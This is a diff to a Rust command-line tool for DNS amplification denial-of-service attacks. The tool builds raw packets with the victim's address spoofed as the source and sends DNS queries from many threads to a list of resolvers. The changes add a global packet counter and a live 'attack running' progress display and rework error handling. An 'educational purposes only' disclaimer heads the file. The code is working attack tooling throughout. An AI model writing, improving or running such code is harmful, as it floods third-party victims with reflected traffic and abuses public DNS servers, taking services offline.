@@ -4,16 +4,15 @@
 // Version: 0.1.0
 // Disclaimer: This script is for educational purposes only. I am not responsible for any damage caused by this script.
 
-
 use std::fs::File;
 use std::io::{self, BufRead, BufReader, Error, ErrorKind};
-use std::sync::Arc;
-use std::sync::atomic::{AtomicBool, Ordering};
-use std::{mem, thread};
 use std::mem::size_of;
 use std::net::Ipv4Addr;
 use std::str::FromStr;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
 use std::time::Duration;
+use std::{mem, thread};
 
 use clap::{arg, command, Parser};
 
@@ -23,8 +22,11 @@ use pnet::packet::Packet;
 
 use reqwest;
 use tokio;
+use tokio::time::Instant;
 
 use libc::{sendto, sockaddr, sockaddr_in, AF_INET, IPPROTO_RAW, SOCK_RAW};
+
+static mut PACKETS_SENT: u64 = 0;
 
 fn colorize(text: &str, color: &str) -> String {
     let color = match color {
@@ -77,15 +79,8 @@ fn send_dns_query(
     let ip_payload = build_ip_packet(source_ip, dst_ip, &udp_payload);
 
     match send_raw_packet(dst_ip, &ip_payload) {
-        Ok(_) => println!(
-            "{} {} {} {} {}...",
-            colorize("Sent", "green"),
-            colorize("DNS", "yellow"),
-            colorize("query", "yellow"),
-            colorize("to", "green"),
-            colorize(&dst_ip.to_string(), "blue")
-        ),
-        Err(err) => println!("Error sending packet: {:?}", err),
+        Ok(_) => (),
+        Err(err) => return Err(Box::new(err)),
     }
 
     Ok(())
@@ -242,7 +237,14 @@ fn amplify(
                     continue;
                 }
             };
-            let _ = send_dns_query(dns_server, domain, source_ip, source_port, record_type);
+            match send_dns_query(dns_server, domain, source_ip, source_port, record_type) {
+                Ok(()) => unsafe {
+                    PACKETS_SENT += 1;
+                },
+                Err(_e) => {
+                    continue;
+                }
+            }
         }
     }
 }
@@ -296,7 +298,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = Args::parse();
 
     let record_type = args.record_type.unwrap();
-    let source_ip = args.target.as_str();
+    let source_ip = args.target;
     let source_port = args.port;
     let time = args.time;
     let domain = args.domain.unwrap();
@@ -316,19 +318,40 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     println!(
         "Attack on {} started with {} threads...",
-        colorize(source_ip, "green"),
+        colorize(&source_ip, "green"),
         colorize(&threads.to_string(), "red")
     );
 
+    let start_time = Instant::now();
+    let source_ip_clone = source_ip.clone();
+
+    thread::spawn(move || loop {
+        let elapsed_time = start_time.elapsed();
+        println!(
+            "Attack on {} running for {} seconds with {} packets sent...",
+            colorize(&source_ip_clone.to_string(), "green"),
+            colorize(&elapsed_time.as_secs().to_string(), "red"),
+            colorize(unsafe { &PACKETS_SENT.to_string() }, "red")
+        );
+        thread::sleep(Duration::from_secs(1));
+    });
+
     for _ in 0..threads {
         let dns_servers = dns_servers.clone();
-        let source_ip = source_ip.to_string();
         let domain = domain.clone();
+        let source_ip = source_ip.clone();
         let record_type = record_type.clone();
         let aborted = aborted.clone();
 
         let handle = thread::spawn(move || {
-            let _ = amplify(&dns_servers, &domain, &source_ip, source_port, &record_type, aborted);
+            let _ = amplify(
+                &dns_servers,
+                &domain,
+                &source_ip,
+                source_port,
+                &record_type,
+                aborted,
+            );
         });
 
         handles.push(handle);
@@ -343,7 +366,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
     }
 
-    println!("Attack on {} finished...", source_ip);
+    println!(
+        "Attack on {} finished after {} seconds with {} packets sent.",
+        colorize(&source_ip.to_string(), "green"),
+        colorize(&start_time.elapsed().as_secs().to_string(), "red"),
+        colorize(unsafe { &PACKETS_SENT.to_string() }, "red")
+    );
 
     Ok(())
 }
